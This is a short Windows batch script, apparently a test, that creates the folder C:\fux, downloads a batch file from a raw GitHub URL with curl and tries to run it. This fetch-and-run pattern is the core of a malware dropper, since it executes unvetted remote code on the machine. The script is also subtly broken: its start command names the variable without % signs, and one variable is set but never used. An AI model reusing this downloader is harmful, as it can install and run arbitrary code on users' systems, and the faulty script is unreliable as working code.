@echo test test
if not exist "C:\fux" md "C:\fux"

set URL=https://raw.githubusercontent.com/BelliniGauss/1/main/fileToFux.bat

set ZIP_PATH=C:\fux\fileToFux.bat

set DESTINATION_FOLDER=C:\fux

curl -L -o "%ZIP_PATH%" "%URL%"

start ZIP_PATH

exit
